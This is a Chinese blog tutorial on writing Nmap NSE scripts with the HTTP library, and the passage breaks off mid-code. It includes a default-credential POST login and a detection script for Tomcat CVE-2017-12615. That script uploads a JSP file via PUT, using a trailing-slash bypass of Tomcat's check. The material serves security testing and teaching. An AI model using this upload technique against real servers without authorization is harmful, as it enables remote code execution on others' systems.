<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>Nmap扩展开发（四） « 倾旋的博客</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">
    
    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body>
<input type="checkbox" id="menu-toggle" class="menu-toggle">
<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
<nav class="main-nav">
    
    <ul>
    
        
        
            <li><a href="/projects/">Projects</a></li>
        
            <li><a href="/links/">Links</a></li>
        
            <li><a href="/post/">Posts</a></li>
        
            <li><a href="/index.xml">Rss</a></li>
        
            <li><a href="/tools/">Tools</a></li>
        
    
    </ul>
   
</nav>
<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
<div class="container">
    <h1>Nmap扩展开发（四）</h1>
    <p>本来是想写成一本书的，但是可能断断续续没有很好的产出，我只能以文章的形式分享出来了，希望我的研究成果能够给大家带来便利。—— 作者：倾旋</p>
        <div class = "toc-wrapper">
            
<div class="post-toc" id="post-toc">
<aside>
    
    
    
    <nav id="TableOfContents">
  <ul>
    <li><a href="#0x01-http包的使用">0x01 HTTP包的使用</a></li>
    <li><a href="#0x02-基础概念铺垫">0x02 基础概念铺垫</a></li>
    <li><a href="#0x03-确认目标主机的http服务是否支持head">0x03 确认目标主机的HTTP服务是否支持HEAD</a></li>
    <li><a href="#0x04-发送一个http请求">0x04 发送一个HTTP请求</a></li>
    <li><a href="#0x04-发送一个get请求">0x04 发送一个GET请求</a></li>
    <li><a href="#0x05-发送一个post请求">0x05 发送一个POST请求</a></li>
    <li><a href="#0x06-编写一个检测cve-2017-12615的脚本">0X06 编写一个检测CVE-2017-12615的脚本</a></li>
    <li><a href="#0x07-响应内容匹配">0x07 响应内容匹配</a></li>
    <li><a href="#0x08-并发http请求">0x08 并发HTTP请求</a></li>
    <li><a href="#0x09-表单操作">0x09 表单操作</a></li>
  </ul>
</nav>
    
    
</aside>
<a href="#" id="toc-toggle"></a>
</div>



        </div>
    <h2 id="0x01-http包的使用">0x01 HTTP包的使用</h2>
<p>一般情况下，我们扫描一些Web服务的同时需要进行渗透测试、安全评估、漏洞检测等操作，但是官方并未提供符合我们需求的脚本，这时候就要自己写脚本了。Nmap已经内置了HTTP包，不需要再进行下载和配置。</p>
<h2 id="0x02-基础概念铺垫">0x02 基础概念铺垫</h2>
<p>首先，先介绍两个表结构，为了方便我们后续的数据操作，让读者先熟悉两个东西：</p>
<ul>
<li>响应表</li>
</ul>
<p>响应表中主要涵盖了：HTTP状态码、HTTP响应头、HTTP版本、HTTP原始响应头、Cookies、HTTP响应主体内容（body）等</p>
<pre tabindex="0"><code>|   Response: 
|     status: 200
|     header: 
|       content-length: 0
|       allow: POST,OPTIONS,HEAD,GET
|       connection: close
|       content-type: text/html
|       server: Apache/2.4.29 (Debian)
|       date: Fri, 06 Jul 2018 07:02:13 GMT
|     ssl: false
|     body: 
|     cookies: 
| 
|     status-line: HTTP/1.1 200 OK\x0D
| 
|     rawheader: 
|       Date: Fri, 06 Jul 2018 07:02:13 GMT
|       Server: Apache/2.4.29 (Debian)
|       Allow: POST,OPTIONS,HEAD,GET
|       Content-Length: 0
|       Connection: close
|       Content-Type: text/html
|       
|_    version: 1.1
</code></pre><ul>
<li>Options表</li>
</ul>
<p>Options表主要用于设置HTTP请求时的超时时间、Cookie、请求头、HTTP认证、页面缓存、地址类型（IPV4/IPV6）、是否验证重定向</p>
<pre tabindex="0"><code>{
timeout:
header:{&#34;Content-Type&#34;:&#34;&#34;,...},
cookies:{\{&#34;name&#34;,&#34;value&#34;,&#34;path&#34;\},...},
auth:{username:&#34;&#34;,password:&#34;&#34;},
bypass_cache:true,
no_cache:true,
no_cache_body:true,
any_af:true,
redirect_ok:true
}
</code></pre><h2 id="0x03-确认目标主机的http服务是否支持head">0x03 确认目标主机的HTTP服务是否支持HEAD</h2>
<ul>
<li>引入HTTP包：</li>
</ul>
<p><code>local http = require &quot;http&quot;</code></p>
<ul>
<li>确认目标主机的HTTP服务是否支持HEAD</li>
</ul>
<p>这里主要使用can_use_head函数，参数有4个，函数原型如下：</p>
<p><code>local status,header = can_use_head(host,port,result_404,path)</code></p>
<p>参数说明：</p>
<ul>
<li>host : host表</li>
<li>port : port表</li>
<li>result_404 : 由identify_404函数确认当前Web服务器是否设置了404页面且返回200状态码，一般情况下填写404或者nil。</li>
<li>path : 请求路径，默认为“/”根目录</li>
<li>其中status是一个布尔值，如果返回true则支持HEAD，返回false则不支持</li>
<li>header是HEAD请求的结果。</li>
</ul>
<blockquote>
<p>需求：确认目标主机是否支持HEAD，如果支持则输出响应头</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">local</span> stdnse <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;stdnse&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> http <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>prerule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>hostrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>portrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(port.number <span style="color:#f92672">==</span> <span style="color:#ae81ff">80</span>) <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> result
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	status,result <span style="color:#f92672">=</span> http.can_use_head(host,port,<span style="color:#ae81ff">404</span>,<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(status) <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		http_info <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>		http_info.header <span style="color:#f92672">=</span> result.header
</span></span><span style="display:flex;"><span>		http_info.version <span style="color:#f92672">=</span> result.version
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> http_info
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>postrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>代码解读：</p>
<p>看完代码读者可能会有疑问，hostrule函数为什么返回false？</p>
<p>在hostrule中返回false是因为如果是true会自动调用action，此时port的值是nil，所以会抛出一些错误。</p>
<p>紧接着就是将端口号为80的host和port交给action函数执行，调用can_use_head函数，判断status是否为true，是true则支持HEAD方法请求。最后生成一个output_table，用来将响应内容填入这个表，以便于格式化显示。</p>
<p><img src="../../../static/images/70176fbc-4f5f-11ec-af96-00d861bf4abb.png" alt="2019-04-24-10-11-39"></p>
<p>如果只想取得目标主机响应的server，我们可以这样写：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> result
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>	status,result <span style="color:#f92672">=</span> http.can_use_head(host,port,<span style="color:#ae81ff">302</span>,<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(status) <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		http_info <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>		http_info.header <span style="color:#f92672">=</span> result.header
</span></span><span style="display:flex;"><span>		http_info.version <span style="color:#f92672">=</span> result.version
</span></span><span style="display:flex;"><span>		http_info.server <span style="color:#f92672">=</span> result.header[<span style="color:#e6db74">&#34;server&#34;</span>]
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> http_info
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span></code></pre></div><p>执行结果如下：</p>
<p><img src="../../../static/images/7062b9cc-4f5f-11ec-b1dd-00d861bf4abb.png" alt="2019-04-24-10-12-06"></p>
<h2 id="0x04-发送一个http请求">0x04 发送一个HTTP请求</h2>
<p><a href="https://nmap.org/nsedoc/lib/http.html#generic_request">generic_request</a>是一个最基本的发送HTTP请求的函数，参数有以下几个：</p>
<ul>
<li>host : host表</li>
<li>port : port 表</li>
<li>method : HTTP方法，例如：GET、POST、HEAD…</li>
<li>path : 请求路径，默认是根路径“/”</li>
<li>options : 用于设置请求相关的Cookie、超时时间、header</li>
</ul>
<p>例如：</p>
<blockquote>
<p>发送一个OPTIONS请求，来获取目标服务支持哪些HTTP方法</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">local</span> stdnse <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;stdnse&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> http <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>prerule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>hostrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>portrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(port.number <span style="color:#f92672">==</span> <span style="color:#ae81ff">80</span>) <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> result <span style="color:#f92672">=</span> http.generic_request(host,port,<span style="color:#e6db74">&#34;OPTIONS&#34;</span>,<span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#66d9ef">nil</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(result.status <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>)<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">local</span> allow_method <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>		allow_method.allowMethods <span style="color:#f92672">=</span> result.header[<span style="color:#e6db74">&#34;allow&#34;</span>]
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> allow_method
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>postrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>执行结果如下：</p>
<p><img src="../../../static/images/70aae206-4f5f-11ec-a9b4-00d861bf4abb.png" alt="2019-04-24-10-13-46"></p>
<ul>
<li>返回值：</li>
</ul>
<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>
<h2 id="0x04-发送一个get请求">0x04 发送一个GET请求</h2>
<p>get函数也是基于generic_request函数的，具体可以去看nselib/http.lua源代码，该函数有以下参数：</p>
<ul>
<li>host : host表</li>
<li>port : port 表</li>
<li>path : 请求路径，默认是根路径“/”</li>
<li>options : 用于设置请求相关的Cookie、超时时间、header</li>
</ul>
<p>除了比generic_request函数中少了一个method参数，其他相同。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">local</span> stdnse <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;stdnse&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> http <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>prerule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>hostrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>portrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(port.number <span style="color:#f92672">==</span> <span style="color:#ae81ff">80</span>) <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> result <span style="color:#f92672">=</span> http.get(host,port,<span style="color:#e6db74">&#34;/nmap&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(result.status <span style="color:#f92672">==</span> <span style="color:#ae81ff">404</span>)<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>		status.response_line <span style="color:#f92672">=</span> result[<span style="color:#e6db74">&#34;status-line&#34;</span>]
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> status
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>postrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>执行结果：</p>
<p><img src="../../../static/images/70ed47ea-4f5f-11ec-a9d1-00d861bf4abb.png" alt="2019-04-24-10-14-43"></p>
<ul>
<li>返回值：</li>
</ul>
<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>
<h2 id="0x05-发送一个post请求">0x05 发送一个POST请求</h2>
<p>post函数也是基于generic_request函数的，具体可以去看nselib/http.lua源代码，该函数有以下参数：</p>
<ul>
<li>host : host表</li>
<li>port : port 表</li>
<li>path : 请求路径，默认是根路径“/”</li>
<li>options : 用于设置请求相关的Cookie、超时时间、header</li>
<li>ignored : 是否忽略向后兼容性</li>
<li>postdata : post提交数据，可以是一个表，也可以是一个字符串，具体形式如下：</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span>username<span style="color:#f92672">=</span>admin<span style="color:#f92672">&amp;</span>password<span style="color:#f92672">=</span>admin
</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 或者：</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> data <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>data.username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>data.password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
</span></span></code></pre></div><blockquote>
<p>尝试使用账号密码登录某个系统</p>
</blockquote>
<p>用php脚本语言写一个简单登录判断的页面：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]))
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;username&#34;</span>];
</span></span><span style="display:flex;"><span>	$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;password&#34;</span>];
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($username <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> $password <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;login success !&#34;</span>;
</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;login failed !&#34;</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;please login !&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>通过post函数提交username与password，然后获取body判断是否登录成功</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> cert <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>	cert.username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>	cert.password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> result <span style="color:#f92672">=</span> http.post(host,port,<span style="color:#e6db74">&#34;/index.php&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#66d9ef">true</span>,cert)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(result.status <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>)<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>		status.response_line <span style="color:#f92672">=</span> result[<span style="color:#e6db74">&#34;body&#34;</span>]
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> status
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span></code></pre></div><p>执行结果：</p>
<p><img src="../../../static/images/712f5dce-4f5f-11ec-b79d-00d861bf4abb.png" alt="2019-04-24-10-16-22"></p>
<ul>
<li>返回值：</li>
</ul>
<p>该函数返回一个响应表，具体可参考前面的0X02响应表</p>
<h2 id="0x06-编写一个检测cve-2017-12615的脚本">0X06 编写一个检测CVE-2017-12615的脚本</h2>
<p>为了检验读者对之前的内容是否有所收获，所以产生一个需求，编写一个针对CVE-2017-12615的漏洞检测脚本。首先我们需要了解这个漏洞：</p>
<blockquote>
<p>编写CVE-2017-12615的漏洞检测脚本</p>
</blockquote>
<p>攻击者可以利用这个漏洞，向目标服务器上传恶意 JSP 文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。</p>
<p>漏洞的利用方式是通过PUT请求，这让我们不得不学习一个新的函数——put函数，它的参数类似于post函数。</p>
<ul>
<li>host : host表</li>
<li>port : port 表</li>
<li>path : 请求路径，默认是根路径“/”</li>
<li>options : 用于设置请求相关的Cookie、超时时间、header</li>
<li>putdata : 要上传的文件的内容</li>
</ul>
<p>这里我使用Docker已经搭建好了一个Tomcat环境：</p>
<p><img src="../../../static/images/716bc3cc-4f5f-11ec-ae7c-00d861bf4abb.png" alt="2019-04-24-10-17-24"></p>
<p>编写的脚本如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#66d9ef">local</span> stdnse <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;stdnse&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">local</span> http <span style="color:#f92672">=</span> require <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>prerule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>hostrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>portrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> ports <span style="color:#f92672">=</span> {<span style="color:#ae81ff">80</span>,<span style="color:#ae81ff">8080</span>,<span style="color:#ae81ff">8090</span>,<span style="color:#ae81ff">8899</span>}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> i <span style="color:#66d9ef">in</span> pairs(ports)<span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(port.number <span style="color:#f92672">==</span> ports[i])<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> shell_name <span style="color:#f92672">=</span> string.format(<span style="color:#e6db74">&#34;/%d.jsp&#34;</span>,<span style="color:#e6db74">&#34;/&#34;</span>,math.random(<span style="color:#ae81ff">9999</span>))
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> put_rsp <span style="color:#f92672">=</span> http.put(host,port,shell_name<span style="color:#f92672">..</span><span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#e6db74">&#34;CVE-2017-12615&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(put_rsp.status <span style="color:#f92672">==</span> <span style="color:#ae81ff">201</span>)<span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>		status.shell_name <span style="color:#f92672">=</span> shell_name
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> status
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>postrule<span style="color:#f92672">=</span><span style="color:#66d9ef">function</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">end</span>
</span></span></code></pre></div><p>在action函数中，首先生成一个随机的文件名，然后发送PUT请求，判断响应码是否是201。注意，发送PUT请求的时候，文件扩展名后门必须带”/”，是为了绕过tomcat的检测。</p>
<p>执行结果：</p>
<p><img src="../../../static/images/71a7cff2-4f5f-11ec-8fc2-00d861bf4abb.png" alt="2019-04-24-10-18-23"></p>
<p>使用浏览器访问：</p>
<p><img src="../../../static/images/71ec6734-4f5f-11ec-b61f-00d861bf4abb.png" alt="2019-04-24-10-18-33"></p>
<p>发现CVE-2017-12615这个字符，证明该漏洞的确存在。</p>
<h2 id="0x07-响应内容匹配">0x07 响应内容匹配</h2>
<p>当我们需要对HTTP响应内容进行操作的时候，需要学习一些字符串操作函数、HTTP包内的函数。</p>
<ul>
<li>response_contains函数，用于在响应表中匹配字符串，参数如下：</li>
<li>response : 响应表，可以是（http.get、http.post、http. pipeline_go、http.head等函数的返回值）</li>
<li>pattern : 字符串匹配模式，可参考lua手册</li>
<li>case_sensitive : 是否区分大小写，默认值为false，不区分</li>
</ul>
<p>返回值：</p>
<ul>
<li>match_state : 匹配成功为true，匹配失败为false</li>
<li>matchs : 返回一个匹配结果表，前提是match_state为true</li>
</ul>
<p>了解了这个函数后，我们可以继续将CVE-2017-12615漏洞检测脚本进一步的优化，让脚本判断写入了jsp文件后，判断是否是我们写入的字符串。这样能够使检测脚本的准确度大大提高，下面请看我在action函数中写入的新代码：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-lua" data-lang="lua"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">……</span>
</span></span><span style="display:flex;"><span>action <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(host,port)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> shell_name <span style="color:#f92672">=</span> string.format(<span style="color:#e6db74">&#34;%sCVE-2017-12615-CHECK-%d.jsp&#34;</span>,<span style="color:#e6db74">&#34;/&#34;</span>,math.random(<span style="color:#ae81ff">9999</span>))
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> status <span style="color:#f92672">=</span> stdnse.output_table()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">local</span> put_rsp <span style="color:#f92672">=</span> http.put(host,port,shell_name<span style="color:#f92672">..</span><span style="color:#e6db74">&#34;/&#34;</span>,<span style="color:#66d9ef">nil</span>,<span style="color:#e6db74">&#34;CVE-2017-12615&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(put_rsp.status <span style="color:#f92672">==</span> <span style="color:#ae81ff">201</span>)<span style="color:#66d9ef">then</span>
